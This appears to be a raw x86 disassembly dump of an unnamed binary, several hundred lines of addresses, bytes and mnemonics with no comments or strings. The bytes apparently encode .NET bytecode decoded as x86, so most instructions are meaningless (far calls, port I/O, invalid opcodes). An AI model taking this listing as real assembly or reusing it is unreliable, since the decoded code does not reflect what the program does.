  403123:	39 e4                	cmp    %esp,%esp
  403125:	01 00                	add    %eax,(%eax)
  403127:	00 38                	add    %bh,(%eax)
  403129:	f9                   	stc
  40312a:	01 00                	add    %eax,(%eax)
  40312c:	00 17                	add    %dl,(%edi)
  40312e:	80 27 00             	andb   $0x0,(%edi)
  403131:	00 04 72             	add    %al,(%edx,%esi,2)
  403134:	6a 07                	push   $0x7
  403136:	00 70 28             	add    %dh,0x28(%eax)
  403139:	43                   	inc    %ebx
  40313a:	00 00                	add    %al,(%eax)
  40313c:	06                   	push   %es
  40313d:	38 e4                	cmp    %ah,%ah
  40313f:	01 00                	add    %eax,(%eax)
  403141:	00 17                	add    %dl,(%edi)
  403143:	80 26 00             	andb   $0x0,(%esi)
  403146:	00 04 38             	add    %al,(%eax,%edi,1)
  403149:	d9 01                	flds   (%ecx)
  40314b:	00 00                	add    %al,(%eax)
  40314d:	00 28                	add    %ch,(%eax)
  40314f:	7e 00                	jle    0x403151
  403151:	00 0a                	add    %cl,(%edx)
  403153:	6f                   	outsl  %ds:(%esi),(%dx)
  403154:	7f 00                	jg     0x403156
  403156:	00 0a                	add    %cl,(%edx)
  403158:	0c 28                	or     $0x28,%al
  40315a:	7e 00                	jle    0x40315c
  40315c:	00 0a                	add    %cl,(%edx)
  40315e:	6f                   	outsl  %ds:(%esi),(%dx)
  40315f:	7f 00                	jg     0x403161
  403161:	00 0a                	add    %cl,(%edx)
  403163:	13 08                	adc    (%eax),%ecx
  403165:	12 08                	adc    (%eax),%cl
  403167:	28 80 00 00 0a 12    	sub    %al,0x120a0000(%eax)
  40316d:	02 28                	add    (%eax),%ch
  40316f:	81 00 00 0a 20 05    	addl   $0x5200a00,(%eax)
  403175:	10 02                	adc    %al,(%edx)
  403177:	00 73 82             	add    %dh,-0x7e(%ebx)
  40317a:	00 00                	add    %al,(%eax)
  40317c:	0a 0d 09 28 83 00    	or     0x832809,%cl
  403182:	00 0a                	add    %cl,(%edx)
  403184:	09 6f 84             	or     %ebp,-0x7c(%edi)
  403187:	00 00                	add    %al,(%eax)
  403189:	0a 09                	or     (%ecx),%cl
  40318b:	6f                   	outsl  %ds:(%esi),(%dx)
  40318c:	85 00                	test   %eax,(%eax)
  40318e:	00 0a                	add    %cl,(%edx)
  403190:	73 86                	jae    0x403118
  403192:	00 00                	add    %al,(%eax)
  403194:	0a 13                	or     (%ebx),%dl
  403196:	04 16                	add    $0x16,%al
  403198:	16                   	push   %ss
  403199:	16                   	push   %ss
  40319a:	16                   	push   %ss
  40319b:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  40319e:	20 00                	and    %al,(%eax)
  4031a0:	cc                   	int3
  4031a1:	00 6f 87             	add    %ch,-0x79(%edi)
  4031a4:	00 00                	add    %al,(%eax)
  4031a6:	0a 73 36             	or     0x36(%ebx),%dh
  4031a9:	00 00                	add    %al,(%eax)
  4031ab:	0a 13                	or     (%ebx),%dl
  4031ad:	05 20 00 01 00       	add    $0x10020,%eax
  4031b2:	00 20                	add    %ah,(%eax)
  4031b4:	9c                   	pushf
  4031b5:	00 00                	add    %al,(%eax)
  4031b7:	00 73 88             	add    %dh,-0x78(%ebx)
  4031ba:	00 00                	add    %al,(%eax)
  4031bc:	0a 13                	or     (%ebx),%dl
  4031be:	06                   	push   %es
  4031bf:	11 06                	adc    %eax,(%esi)
  4031c1:	28 83 00 00 0a 13    	sub    %al,0x130a0000(%ebx)
  4031c7:	07                   	pop    %es
  4031c8:	11 07                	adc    %eax,(%edi)
  4031ca:	09 16                	or     %edx,(%esi)
  4031cc:	16                   	push   %ss
  4031cd:	20 00                	and    %al,(%eax)
  4031cf:	01 00                	add    %eax,(%eax)
  4031d1:	00 20                	add    %ah,(%eax)
  4031d3:	9c                   	pushf
  4031d4:	00 00                	add    %al,(%eax)
  4031d6:	00 73 89             	add    %dh,-0x77(%ebx)
  4031d9:	00 00                	add    %al,(%eax)
  4031db:	0a 16                	or     (%esi),%dl
  4031dd:	16                   	push   %ss
  4031de:	09 6f 84             	or     %ebp,-0x7c(%edi)
  4031e1:	00 00                	add    %al,(%eax)
  4031e3:	0a 09                	or     (%ecx),%cl
  4031e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4031e6:	85 00                	test   %eax,(%eax)
  4031e8:	00 0a                	add    %cl,(%edx)
  4031ea:	73 89                	jae    0x403175
  4031ec:	00 00                	add    %al,(%eax)
  4031ee:	0a 18                	or     (%eax),%bl
  4031f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4031f1:	8a 00                	mov    (%eax),%al
  4031f3:	00 0a                	add    %cl,(%edx)
  4031f5:	11 06                	adc    %eax,(%esi)
  4031f7:	11 05 28 8b 00 00    	adc    %eax,0x8b28
  4031fd:	0a 6f 8c             	or     -0x74(%edi),%ch
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 72 7a             	or     0x7a(%edx),%dh
  403205:	07                   	pop    %es
  403206:	00 70 7e             	add    %dh,0x7e(%eax)
  403209:	1b 00                	sbb    (%eax),%eax
  40320b:	00 04 28             	add    %al,(%eax,%ebp,1)
  40320e:	49                   	dec    %ecx
  40320f:	00 00                	add    %al,(%eax)
  403211:	0a 28                	or     (%eax),%ch
  403213:	20 00                	and    %al,(%eax)
  403215:	00 06                	add    %al,(%esi)
  403217:	28 49 00             	sub    %cl,0x0(%ecx)
  40321a:	00 0a                	add    %cl,(%edx)
  40321c:	7e 1b                	jle    0x403239
  40321e:	00 00                	add    %al,(%eax)
  403220:	04 28                	add    $0x28,%al
  403222:	49                   	dec    %ecx
  403223:	00 00                	add    %al,(%eax)
  403225:	0a 28                	or     (%eax),%ch
  403227:	8d 00                	lea    (%eax),%eax
  403229:	00 0a                	add    %cl,(%edx)
  40322b:	11 05 6f 3a 00 00    	adc    %eax,0x3a6f
  403231:	0a 6f 30             	or     0x30(%edi),%ch
  403234:	00 00                	add    %al,(%eax)
  403236:	0a 28                	or     (%eax),%ch
  403238:	49                   	dec    %ecx
  403239:	00 00                	add    %al,(%eax)
  40323b:	0a 28                	or     (%eax),%ch
  40323d:	33 00                	xor    (%eax),%eax
  40323f:	00 0a                	add    %cl,(%edx)
  403241:	28 43 00             	sub    %al,0x0(%ebx)
  403244:	00 06                	add    %al,(%esi)
  403246:	11 05 6f 3c 00 00    	adc    %eax,0x3c6f
  40324c:	0a 11                	or     (%ecx),%dl
  40324e:	06                   	push   %es
  40324f:	6f                   	outsl  %ds:(%esi),(%dx)
  403250:	8e 00                	mov    (%eax),%es
  403252:	00 0a                	add    %cl,(%edx)
  403254:	11 07                	adc    %eax,(%edi)
  403256:	6f                   	outsl  %ds:(%esi),(%dx)
  403257:	8f 00                	pop    (%eax)
  403259:	00 0a                	add    %cl,(%edx)
  40325b:	09 6f 8e             	or     %ebp,-0x72(%edi)
  40325e:	00 00                	add    %al,(%eax)
  403260:	0a de                	or     %dh,%bl
  403262:	0c 28                	or     $0x28,%al
  403264:	2c 00                	sub    $0x0,%al
  403266:	00 0a                	add    %cl,(%edx)
  403268:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40326e:	00 dd                	add    %bl,%ch
  403270:	b2 00                	mov    $0x0,%dl
  403272:	00 00                	add    %al,(%eax)
  403274:	25 28 2c 00 00       	and    $0x2c28,%eax
  403279:	0a 13                	or     (%ebx),%dl
  40327b:	09 28                	or     %ebp,(%eax)
  40327d:	2d 00 00 0a dd       	sub    $0xdd0a0000,%eax
  403282:	a0 00 00 00 06       	mov    0x6000000,%al
  403287:	17                   	pop    %ss
  403288:	9a 28 17 00 00 06 14 	lcall  $0x1406,$0x1728
  40328f:	16                   	push   %ss
  403290:	28 56 00             	sub    %dl,0x0(%esi)
  403293:	00 0a                	add    %cl,(%edx)
  403295:	2d 2b 06 17 9a       	sub    $0x9a17062b,%eax
  40329a:	28 90 00 00 0a 72    	sub    %dl,0x720a0000(%eax)
  4032a0:	84 07                	test   %al,(%edi)
  4032a2:	00 70 7e             	add    %dh,0x7e(%eax)
  4032a5:	1b 00                	sbb    (%eax),%eax
  4032a7:	00 04 28             	add    %al,(%eax,%ebp,1)
  4032aa:	7d 00                	jge    0x4032ac
  4032ac:	00 0a                	add    %cl,(%edx)
  4032ae:	06                   	push   %es
  4032af:	17                   	pop    %ss
  4032b0:	9a 28 7d 00 00 0a 28 	lcall  $0x280a,$0x7d28
  4032b7:	33 00                	xor    (%eax),%eax
  4032b9:	00 0a                	add    %cl,(%edx)
  4032bb:	28 43 00             	sub    %al,0x0(%ebx)
  4032be:	00 06                	add    %al,(%esi)
  4032c0:	2b 64 06 17          	sub    0x17(%esi,%eax,1),%esp
  4032c4:	9a 28 17 00 00 06 28 	lcall  $0x2806,$0x1728
  4032cb:	1e                   	push   %ds
  4032cc:	00 00                	add    %al,(%eax)
  4032ce:	0a 16                	or     (%esi),%dl
  4032d0:	13 0a                	adc    (%edx),%ecx
  4032d2:	12 0a                	adc    (%edx),%cl
  4032d4:	28 1b                	sub    %bl,(%ebx)
  4032d6:	00 00                	add    %al,(%eax)
  4032d8:	06                   	push   %es
  4032d9:	14 28                	adc    $0x28,%al
  4032db:	3d 00 00 06 2b       	cmp    $0x2b060000,%eax
  4032e0:	45                   	inc    %ebp
  4032e1:	06                   	push   %es
  4032e2:	18 9a 06 17 9a 28    	sbb    %bl,0x289a1706(%edx)
  4032e8:	18 00                	sbb    %al,(%eax)
  4032ea:	00 06                	add    %al,(%esi)
  4032ec:	26 06                	es push %es
  4032ee:	18 9a 28 17 00 00    	sbb    %bl,0x1728(%edx)
  4032f4:	06                   	push   %es
  4032f5:	28 1e                	sub    %bl,(%esi)
  4032f7:	00 00                	add    %al,(%eax)
  4032f9:	0a 16                	or     (%esi),%dl
  4032fb:	13 0a                	adc    (%edx),%ecx
  4032fd:	12 0a                	adc    (%edx),%cl
  4032ff:	28 1b                	sub    %bl,(%ebx)
  403301:	00 00                	add    %al,(%eax)
  403303:	06                   	push   %es
  403304:	14 28                	adc    $0x28,%al
  403306:	3d 00 00 06 2b       	cmp    $0x2b060000,%eax
  40330b:	1a 06                	sbb    (%esi),%al
  40330d:	17                   	pop    %ss
  40330e:	9a 28 1e 00 00 0a 16 	lcall  $0x160a,$0x1e28
  403315:	13 0a                	adc    (%edx),%ecx
  403317:	12 0a                	adc    (%edx),%cl
  403319:	28 1b                	sub    %bl,(%ebx)
  40331b:	00 00                	add    %al,(%eax)
  40331d:	06                   	push   %es
  40331e:	06                   	push   %es
  40331f:	18 9a 28 3d 00 00    	sbb    %bl,0x3d28(%edx)
  403325:	06                   	push   %es
  403326:	de 3e                	fidivrs (%esi)
  403328:	25 28 2c 00 00       	and    $0x2c28,%eax
  40332d:	0a 13                	or     (%ebx),%dl
  40332f:	0b 72 8c             	or     -0x74(%edx),%esi
  403332:	07                   	pop    %es
  403333:	00 70 7e             	add    %dh,0x7e(%eax)
  403336:	1b 00                	sbb    (%eax),%eax
  403338:	00 04 28             	add    %al,(%eax,%ebp,1)
  40333b:	7d 00                	jge    0x40333d
  40333d:	00 0a                	add    %cl,(%edx)
  40333f:	72 94                	jb     0x4032d5
  403341:	07                   	pop    %es
  403342:	00 70 28             	add    %dh,0x28(%eax)
  403345:	7d 00                	jge    0x403347
  403347:	00 0a                	add    %cl,(%edx)
  403349:	11 0b                	adc    %ecx,(%ebx)
  40334b:	6f                   	outsl  %ds:(%esi),(%dx)
  40334c:	91                   	xchg   %eax,%ecx
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a 28                	or     (%eax),%ch
  403351:	7d 00                	jge    0x403353
  403353:	00 0a                	add    %cl,(%edx)
  403355:	28 33                	sub    %dh,(%ebx)
  403357:	00 00                	add    %al,(%eax)
  403359:	0a 28                	or     (%eax),%ch
  40335b:	43                   	inc    %ebx
  40335c:	00 00                	add    %al,(%eax)
  40335e:	06                   	push   %es
  40335f:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  403365:	00 2a                	add    %ch,(%edx)
  403367:	00 41 64             	add    %al,0x64(%ecx)
	...
  403372:	00 00                	add    %al,(%eax)
  403374:	39 00                	cmp    %eax,(%eax)
  403376:	00 00                	add    %al,(%eax)
  403378:	39 00                	cmp    %eax,(%eax)
  40337a:	00 00                	add    %al,(%eax)
  40337c:	0c 00                	or     $0x0,%al
  40337e:	00 00                	add    %al,(%eax)
  403380:	14 00                	adc    $0x0,%al
  403382:	00 01                	add    %al,(%ecx)
  403384:	00 00                	add    %al,(%eax)
  403386:	00 00                	add    %al,(%eax)
  403388:	e6 01                	out    %al,$0x1
  40338a:	00 00                	add    %al,(%eax)
  40338c:	1d 00 00 00 03       	sbb    $0x3000000,%eax
  403391:	02 00                	add    (%eax),%al
  403393:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403396:	00 00                	add    %al,(%eax)
  403398:	14 00                	adc    $0x0,%al
  40339a:	00 01                	add    %al,(%ecx)
  40339c:	00 00                	add    %al,(%eax)
  40339e:	00 00                	add    %al,(%eax)
  4033a0:	ee                   	out    %al,(%dx)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 26                	add    %ah,(%esi)
  4033a5:	01 00                	add    %eax,(%eax)
  4033a7:	00 14 02             	add    %dl,(%edx,%eax,1)
  4033aa:	00 00                	add    %al,(%eax)
  4033ac:	12 00                	adc    (%eax),%al
  4033ae:	00 00                	add    %al,(%eax)
  4033b0:	14 00                	adc    $0x0,%al
  4033b2:	00 01                	add    %al,(%ecx)
  4033b4:	00 00                	add    %al,(%eax)
  4033b6:	00 00                	add    %al,(%eax)
  4033b8:	67 00 00             	add    %al,(%bx,%si)
  4033bb:	00 61 02             	add    %ah,0x2(%ecx)
  4033be:	00 00                	add    %al,(%eax)
  4033c0:	c8 02 00 00          	enter  $0x2,$0x0
  4033c4:	3e 00 00             	add    %al,%ds:(%eax)
  4033c7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4033ca:	00 01                	add    %al,(%ecx)
  4033cc:	1b 30                	sbb    (%eax),%esi
  4033ce:	06                   	push   %es
  4033cf:	00 8d 01 00 00 11    	add    %cl,0x11000001(%ebp)
  4033d5:	00 00                	add    %al,(%eax)
  4033d7:	11 28                	adc    %ebp,(%eax)
  4033d9:	92                   	xchg   %eax,%edx
  4033da:	00 00                	add    %al,(%eax)
  4033dc:	0a 02                	or     (%edx),%al
  4033de:	6f                   	outsl  %ds:(%esi),(%dx)
  4033df:	93                   	xchg   %eax,%ebx
  4033e0:	00 00                	add    %al,(%eax)
  4033e2:	0a 6f 94             	or     -0x6c(%edi),%ch
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	0a 0a                	or     (%edx),%cl
  4033e9:	16                   	push   %ss
  4033ea:	0b 38                	or     (%eax),%edi
  4033ec:	2b 01                	sub    (%ecx),%eax
  4033ee:	00 00                	add    %al,(%eax)
  4033f0:	06                   	push   %es
  4033f1:	07                   	pop    %es
  4033f2:	9a 6f 95 00 00 0a 0c 	lcall  $0xc0a,$0x956f
  4033f9:	16                   	push   %ss
  4033fa:	0d 38 0e 01 00       	or     $0x10e38,%eax
  4033ff:	00 08                	add    %cl,(%eax)
  403401:	09 9a 13 04 11 04    	or     %ebx,0x4110413(%edx)
  403407:	6f                   	outsl  %ds:(%esi),(%dx)
  403408:	96                   	xchg   %eax,%esi
  403409:	00 00                	add    %al,(%eax)
  40340b:	0a 72 a4             	or     -0x5c(%edx),%dh
  40340e:	07                   	pop    %es
  40340f:	00 70 16             	add    %dh,0x16(%eax)
  403412:	28 56 00             	sub    %dl,0x0(%esi)
  403415:	00 0a                	add    %cl,(%edx)
  403417:	2d 67 11 04 14       	sub    $0x14041167,%eax
  40341c:	1f                   	pop    %ds
  40341d:	09 8d 07 00 00 01    	or     %ecx,0x1000007(%ebp)
  403423:	25 16 7e 09 00       	and    $0x97e16,%eax
  403428:	00 04 a2             	add    %al,(%edx,%eiz,4)
  40342b:	25 17 7e 0a 00       	and    $0xa7e17,%eax
  403430:	00 04 8c             	add    %al,(%esp,%ecx,4)
  403433:	59                   	pop    %ecx
  403434:	00 00                	add    %al,(%eax)
  403436:	01 a2 25 18 7e 1c    	add    %esp,0x1c7e1825(%edx)
  40343c:	00 00                	add    %al,(%eax)
  40343e:	04 a2                	add    $0xa2,%al
  403440:	25 19 7e 1d 00       	and    $0x1d7e19,%eax
  403445:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403448:	25 1a 7e 0b 00       	and    $0xb7e1a,%eax
  40344d:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403450:	25 1b 7e 16 00       	and    $0x167e1b,%eax
  403455:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403458:	25 1c 28 25 00       	and    $0x25281c,%eax
  40345d:	00 06                	add    %al,(%esi)
  40345f:	a2 25 1d 28 20       	mov    %al,0x20281d25
  403464:	00 00                	add    %al,(%eax)
  403466:	06                   	push   %es
  403467:	a2 25 1e 7e 08       	mov    %al,0x87e1e25
  40346c:	00 00                	add    %al,(%eax)
  40346e:	04 28                	add    $0x28,%al
  403470:	4b                   	dec    %ebx
  403471:	00 00                	add    %al,(%eax)
  403473:	06                   	push   %es
  403474:	a2 6f 97 00 00       	mov    %al,0x976f
  403479:	0a 26                	or     (%esi),%ah
  40347b:	38 8a 00 00 00 11    	cmp    %cl,0x11000000(%edx)
  403481:	04 6f                	add    $0x6f,%al
  403483:	96                   	xchg   %eax,%esi
  403484:	00 00                	add    %al,(%eax)
  403486:	0a 72 aa             	or     -0x56(%edx),%dh
  403489:	07                   	pop    %es
  40348a:	00 70 16             	add    %dh,0x16(%eax)
  40348d:	28 56 00             	sub    %dl,0x0(%esi)
  403490:	00 0a                	add    %cl,(%edx)
  403492:	2d 1d 11 04 14       	sub    $0x1404111d,%eax
  403497:	18 8d 07 00 00 01    	sbb    %cl,0x1000007(%ebp)
  40349d:	25 16 28 25 00       	and    $0x252816,%eax
  4034a2:	00 06                	add    %al,(%esi)
  4034a4:	a2 25 17 03 a2       	mov    %al,0xa2031725
  4034a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4034aa:	97                   	xchg   %eax,%edi
  4034ab:	00 00                	add    %al,(%eax)
  4034ad:	0a 26                	or     (%esi),%ah
  4034af:	2b 59 11             	sub    0x11(%ecx),%ebx
  4034b2:	04 6f                	add    $0x6f,%al
  4034b4:	96                   	xchg   %eax,%esi
  4034b5:	00 00                	add    %al,(%eax)
  4034b7:	0a 72 b4             	or     -0x4c(%edx),%dh
  4034ba:	07                   	pop    %es
  4034bb:	00 70 16             	add    %dh,0x16(%eax)
  4034be:	28 56 00             	sub    %dl,0x0(%esi)
  4034c1:	00 0a                	add    %cl,(%edx)
  4034c3:	2d 45 11 04 14       	sub    $0x14041145,%eax
  4034c8:	1c 8d                	sbb    $0x8d,%al
  4034ca:	07                   	pop    %es
  4034cb:	00 00                	add    %al,(%eax)
  4034cd:	01 25 16 7e 13 00    	add    %esp,0x137e16
  4034d3:	00 04 8c             	add    %al,(%esp,%ecx,4)
  4034d6:	22 00                	and    (%eax),%al
  4034d8:	00 01                	add    %al,(%ecx)
  4034da:	a2 25 17 7e 0e       	mov    %al,0xe7e1725
  4034df:	00 00                	add    %al,(%eax)
  4034e1:	04 a2                	add    $0xa2,%al
  4034e3:	25 18 7e 16 00       	and    $0x167e18,%eax
  4034e8:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4034eb:	25 19 28 2b 00       	and    $0x2b2819,%eax
  4034f0:	00 06                	add    %al,(%esi)
  4034f2:	8c 22                	mov    %fs,(%edx)
  4034f4:	00 00                	add    %al,(%eax)
  4034f6:	01 a2 25 1a 28 25    	add    %esp,0x25281a25(%edx)
  4034fc:	00 00                	add    %al,(%eax)
  4034fe:	06                   	push   %es
  4034ff:	a2 25 1b 03 a2       	mov    %al,0xa2031b25
  403504:	6f                   	outsl  %ds:(%esi),(%dx)
  403505:	97                   	xchg   %eax,%edi
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 26                	or     (%esi),%ah
  40350a:	09 17                	or     %edx,(%edi)
  40350c:	d6                   	salc
  40350d:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403512:	3f                   	aas
  403513:	e9 fe ff ff 07       	jmp    0x8403516
  403518:	17                   	pop    %ss
  403519:	d6                   	salc
  40351a:	0b 07                	or     (%edi),%eax
  40351c:	06                   	push   %es
  40351d:	8e 69 3f             	mov    0x3f(%ecx),%gs
  403520:	cc                   	int3
  403521:	fe                   	(bad)
  403522:	ff                   	(bad)
  403523:	ff                   	lcall  (bad)
  403524:	de 3e                	fidivrs (%esi)
  403526:	25 28 2c 00 00       	and    $0x2c28,%eax
  40352b:	0a 13                	or     (%ebx),%dl
  40352d:	05 72 8c 07 00       	add    $0x78c72,%eax
  403532:	70 7e                	jo     0x4035b2
  403534:	1b 00                	sbb    (%eax),%eax
  403536:	00 04 28             	add    %al,(%eax,%ebp,1)
  403539:	7d 00                	jge    0x40353b
  40353b:	00 0a                	add    %cl,(%edx)
  40353d:	72 ba                	jb     0x4034f9
  40353f:	07                   	pop    %es
  403540:	00 70 28             	add    %dh,0x28(%eax)
  403543:	7d 00                	jge    0x403545
  403545:	00 0a                	add    %cl,(%edx)
  403547:	11 05 6f 91 00 00    	adc    %eax,0x916f
  40354d:	0a 28                	or     (%eax),%ch
  40354f:	7d 00                	jge    0x403551
  403551:	00 0a                	add    %cl,(%edx)
  403553:	28 33                	sub    %dh,(%ebx)
  403555:	00 00                	add    %al,(%eax)
  403557:	0a 28                	or     (%eax),%ch
  403559:	43                   	inc    %ebx
  40355a:	00 00                	add    %al,(%eax)
  40355c:	06                   	push   %es
  40355d:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  403563:	00 2a                	add    %ch,(%edx)
  403565:	00 00                	add    %al,(%eax)
  403567:	00 41 1c             	add    %al,0x1c(%ecx)
	...
  403572:	00 00                	add    %al,(%eax)
  403574:	4e                   	dec    %esi
  403575:	01 00                	add    %eax,(%eax)
  403577:	00 4e 01             	add    %cl,0x1(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	3e 00 00             	add    %al,%ds:(%eax)
  40357f:	00 14 00             	add    %dl,(%eax,%eax,1)
  403582:	00 01                	add    %al,(%ecx)
  403584:	03 30                	add    (%eax),%esi
  403586:	02 00                	add    (%eax),%al
  403588:	6f                   	outsl  %ds:(%esi),(%dx)
  403589:	00 00                	add    %al,(%eax)
  40358b:	00 00                	add    %al,(%eax)
  40358d:	00 00                	add    %al,(%eax)
  40358f:	00 7e 0c             	add    %bh,0xc(%esi)
  403592:	00 00                	add    %al,(%eax)
  403594:	04 80                	add    $0x80,%al
  403596:	1c 00                	sbb    $0x0,%al
  403598:	00 04 7e             	add    %al,(%esi,%edi,2)
  40359b:	0d 00 00 04 80       	or     $0x80040000,%eax
  4035a0:	1d 00 00 04 73       	sbb    $0x73040000,%eax
  4035a5:	98                   	cwtl
  4035a6:	00 00                	add    %al,(%eax)
  4035a8:	0a 80 1f 00 00 04    	or     0x400001f(%eax),%al
  4035ae:	14 fe                	adc    $0xfe,%al
  4035b0:	06                   	push   %es
  4035b1:	40                   	inc    %eax
  4035b2:	00 00                	add    %al,(%eax)
  4035b4:	06                   	push   %es
  4035b5:	73 99                	jae    0x403550
  4035b7:	00 00                	add    %al,(%eax)
  4035b9:	0a 73 9a             	or     -0x66(%ebx),%dh
  4035bc:	00 00                	add    %al,(%eax)
  4035be:	0a 80 20 00 00 04    	or     0x4000020(%eax),%al
  4035c4:	16                   	push   %ss
  4035c5:	80 21 00             	andb   $0x0,(%ecx)
  4035c8:	00 04 14             	add    %al,(%esp,%edx,1)
  4035cb:	80 22 00             	andb   $0x0,(%edx)
  4035ce:	00 04 14             	add    %al,(%esp,%edx,1)
  4035d1:	80 23 00             	andb   $0x0,(%ebx)
  4035d4:	00 04 16             	add    %al,(%esi,%edx,1)
  4035d7:	80 24 00 00          	andb   $0x0,(%eax,%eax,1)
  4035db:	04 73                	add    $0x73,%al
  4035dd:	9b                   	fwait
  4035de:	00 00                	add    %al,(%eax)
  4035e0:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4035e6:	16                   	push   %ss
  4035e7:	80 26 00             	andb   $0x0,(%esi)
  4035ea:	00 04 16             	add    %al,(%esi,%edx,1)
  4035ed:	80 27 00             	andb   $0x0,(%edi)
  4035f0:	00 04 16             	add    %al,(%esi,%edx,1)
  4035f3:	80 28 00             	subb   $0x0,(%eax)
  4035f6:	00 04 16             	add    %al,(%esi,%edx,1)
  4035f9:	80 29 00             	subb   $0x0,(%ecx)
  4035fc:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4035ff:	1e                   	push   %ds
  403600:	1b 30                	sbb    (%eax),%esi
  403602:	0a 00                	or     (%eax),%al
  403604:	d3 01                	roll   %cl,(%ecx)
  403606:	00 00                	add    %al,(%eax)
  403608:	12 00                	adc    (%eax),%al
  40360a:	00 11                	add    %dl,(%ecx)
  40360c:	00 17                	add    %dl,(%edi)
  40360e:	28 77 00             	sub    %dh,0x0(%edi)
  403611:	00 0a                	add    %cl,(%edx)
  403613:	7e 24                	jle    0x403639
  403615:	00 00                	add    %al,(%eax)
  403617:	04 17                	add    $0x17,%al
  403619:	d6                   	salc
  40361a:	80 24 00 00          	andb   $0x0,(%eax,%eax,1)
  40361e:	04 7e                	add    $0x7e,%al
  403620:	24 00                	and    $0x0,%al
  403622:	00 04 20             	add    %al,(%eax,%eiz,1)
  403625:	c8 00 00 00          	enter  $0x0,$0x0
  403629:	33 36                	xor    (%esi),%esi
  40362b:	16                   	push   %ss
  40362c:	80 24 00 00          	andb   $0x0,(%eax,%eax,1)
  403630:	04 7e                	add    $0x7e,%al
  403632:	1e                   	push   %ds
  403633:	00 00                	add    %al,(%eax)
  403635:	04 6f                	add    $0x6f,%al
  403637:	9c                   	pushf
  403638:	00 00                	add    %al,(%eax)
  40363a:	0a 15 16 6f 9d 00    	or     0x9d6f16,%dl
  403640:	00 0a                	add    %cl,(%edx)
  403642:	2c 0c                	sub    $0xc,%al
  403644:	7e 1e                	jle    0x403664
  403646:	00 00                	add    %al,(%eax)
  403648:	04 6f                	add    $0x6f,%al
  40364a:	9e                   	sahf
  40364b:	00 00                	add    %al,(%eax)
  40364d:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  403650:	7e 1e                	jle    0x403670
  403652:	00 00                	add    %al,(%eax)
  403654:	04 6f                	add    $0x6f,%al
  403656:	9f                   	lahf
  403657:	00 00                	add    %al,(%eax)
  403659:	0a 2d 05 dd 4f 01    	or     0x14fdd05,%ch
  40365f:	00 00                	add    %al,(%eax)
  403661:	7e 1e                	jle    0x403681
  403663:	00 00                	add    %al,(%eax)
  403665:	04 6f                	add    $0x6f,%al
  403667:	9e                   	sahf
  403668:	00 00                	add    %al,(%eax)
  40366a:	0a 16                	or     (%esi),%dl
  40366c:	3e 2c 01             	ds sub $0x1,%al
  40366f:	00 00                	add    %al,(%eax)
  403671:	7e 1e                	jle    0x403691
  403673:	00 00                	add    %al,(%eax)
  403675:	04 6f                	add    $0x6f,%al
  403677:	9e                   	sahf
  403678:	00 00                	add    %al,(%eax)
  40367a:	0a 17                	or     (%edi),%dl
  40367c:	da 17                	ficoml (%edi)
  40367e:	d6                   	salc
  40367f:	8d 2d 00 00 01 0a    	lea    0xa010000,%ebp
  403685:	7e 1e                	jle    0x4036a5
  403687:	00 00                	add    %al,(%eax)
  403689:	04 6f                	add    $0x6f,%al
  40368b:	9c                   	pushf
  40368c:	00 00                	add    %al,(%eax)
  40368e:	0a 06                	or     (%esi),%al
  403690:	16                   	push   %ss
  403691:	06                   	push   %es
  403692:	8e 69 16             	mov    0x16(%ecx),%gs
  403695:	6f                   	outsl  %ds:(%esi),(%dx)
  403696:	a0 00 00 0a 26       	mov    0x260a0000,%al
  40369b:	7e 22                	jle    0x4036bf
  40369d:	00 00                	add    %al,(%eax)
  40369f:	04 06                	add    $0x6,%al
  4036a1:	16                   	push   %ss
  4036a2:	06                   	push   %es
  4036a3:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4036a6:	39 00                	cmp    %eax,(%eax)
  4036a8:	00 0a                	add    %cl,(%edx)
  4036aa:	7e 22                	jle    0x4036ce
  4036ac:	00 00                	add    %al,(%eax)
  4036ae:	04 6f                	add    $0x6f,%al
  4036b0:	3a 00                	cmp    (%eax),%al
  4036b2:	00 0a                	add    %cl,(%edx)
  4036b4:	28 15 00 00 06 7e    	sub    %dl,0x7e060000
  4036ba:	1c 00                	sbb    $0x0,%al
  4036bc:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4036bf:	22 00                	and    (%eax),%al
  4036c1:	00 0a                	add    %cl,(%edx)
  4036c3:	39 d5                	cmp    %edx,%ebp
  4036c5:	00 00                	add    %al,(%eax)
  4036c7:	00 7e 22             	add    %bh,0x22(%esi)
  4036ca:	00 00                	add    %al,(%eax)
  4036cc:	04 6f                	add    $0x6f,%al
  4036ce:	3a 00                	cmp    (%eax),%al
  4036d0:	00 0a                	add    %cl,(%edx)
  4036d2:	7e 1c                	jle    0x4036f0
  4036d4:	00 00                	add    %al,(%eax)
  4036d6:	04 28                	add    $0x28,%al
  4036d8:	19 00                	sbb    %eax,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	0b 7e 2b             	or     0x2b(%esi),%edi
  4036df:	00 00                	add    %al,(%eax)
  4036e1:	04 2c                	add    $0x2c,%al
  4036e3:	07                   	pop    %es
  4036e4:	7e 2b                	jle    0x403711
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	04 2b                	add    $0x2b,%al
  4036ea:	16                   	push   %ss
  4036eb:	7e 2a                	jle    0x403717
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	04 fe                	add    $0xfe,%al
  4036f1:	06                   	push   %es
